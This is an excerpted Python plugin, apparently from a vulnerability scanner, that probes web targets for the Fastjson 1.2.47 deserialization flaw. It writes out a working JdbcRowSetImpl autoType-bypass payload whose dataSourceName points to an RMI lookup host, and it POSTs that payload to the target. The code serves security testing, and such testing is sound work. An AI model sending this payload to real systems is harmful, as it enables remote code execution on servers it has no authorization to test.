...
class Checker(BaseChecker):
    def init_plugin_info(self):
        ...
        author = "b5mali4"
        name = "fastjson2"
        imp_version = "fastjson在1.2.47及之前版本"
    ...
    def check_logic(self, request_raw):
        ...
        1.普通参数 将其转成json
        2.xml将其转成json  
        3.然后多加 {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://asdfasfd/","autoCommit":true}},age:11} 到json头部
        ...
        if http_method == HttpMethod.POST:
            poc_data = dict()
            poc_data['name'] = {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}
            poc_data['f'] = {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": attack_payload + "/poc",
                             "autoCommit": "true"}
            # temp_headers["content-type:"] = "application/json;"
            try:
                requests.post(url=temp_url, data=json.dumps(poc_data), headers=temp_headers, timeout=5, verify=False)
